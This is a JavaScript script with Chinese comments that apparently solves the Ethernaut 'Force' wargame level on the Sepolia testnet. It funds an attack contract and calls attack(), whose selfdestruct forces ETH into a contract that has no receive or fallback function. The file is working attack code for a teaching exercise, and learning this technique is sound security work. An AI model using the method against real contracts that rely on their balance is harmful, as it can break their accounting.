/**
 * 强制向合约发送 ETH 的方法：
 *
 * 1. selfdestruct (本脚本使用)
 *    - 原理: SELFDESTRUCT 操作码会在 EVM 层面直接转移余额
 *    - 不触发目标合约的 receive/fallback，无法被拒绝
 *
 * 2. 预计算地址 (理论方法)
 *    - 提前计算合约地址: keccak256(rlp([sender, nonce]))
 *    - 先向地址发送 ETH，再部署合约
 *
 * 3. Coinbase 奖励 (矿工专属)
 *    - 矿工可以将区块奖励发送到任意地址
 *    - 普通用户无法使用
 */

import { createWalletClient, createPublicClient, http, parseEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { sepolia } from 'viem/chains';

// 从环境变量读取配置
const RPC_URL = process.env.sepolia_rpc;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const FORCE_ADDRESS = process.env.Force_ADDRESS;
const ATTACK_ADDRESS = process.env.AttackForce_ADDRESS; // 需要先用 forge create 部署

async function main() {
    const client = createPublicClient({
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const account = privateKeyToAccount(PRIVATE_KEY);

    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    console.log('=== Force Attack: selfdestruct ===\n');

    // 1. 检查 Force 合约当前余额
    const balanceBefore = await client.getBalance({
        address: FORCE_ADDRESS
    });
    console.log('Force contract balance before:', balanceBefore.toString(), 'wei');

    // 2. 向 AttackForce 合约发送 ETH
    console.log('\nSending 0.001 ETH to AttackForce contract...');
    const sendHash = await walletClient.sendTransaction({
        to: ATTACK_ADDRESS,
        value: parseEther('0.000001')
    });
    console.log('Send transaction hash:', sendHash);

    await client.waitForTransactionReceipt({ hash: sendHash });
    console.log('✓ ETH sent to AttackForce');

    // 3. 检查 AttackForce 合约余额
    const attackBalance = await client.getBalance({
        address: ATTACK_ADDRESS
    });
    console.log('AttackForce balance:', attackBalance.toString(), 'wei');

    // 4. 调用 attack() 函数触发 selfdestruct
    console.log('\nCalling attack() to trigger selfdestruct...');

    const attackAbi = [
        {
            "inputs": [],
            "name": "attack",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    const attackHash = await walletClient.writeContract({
        address: ATTACK_ADDRESS,
        abi: attackAbi,
        functionName: 'attack'
    });
    console.log('Attack transaction hash:', attackHash);

    const receipt = await client.waitForTransactionReceipt({ hash: attackHash });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');

    // 5. 检查 Force 合约的新余额
    const balanceAfter = await client.getBalance({
        address: FORCE_ADDRESS
    });
    console.log('\n=== Results ===');
    console.log('Force balance before:', balanceBefore.toString(), 'wei');
    console.log('Force balance after:', balanceAfter.toString(), 'wei');
    console.log('ETH forced into contract:', (balanceAfter - balanceBefore).toString(), 'wei');

    if (balanceAfter > 0n) {
        console.log('\n✓✓✓ Attack successful! Force contract now has ETH despite having no receive/fallback.');
    } else {
        console.log('\n✗ Attack failed.');
    }
}
main().catch(console.error);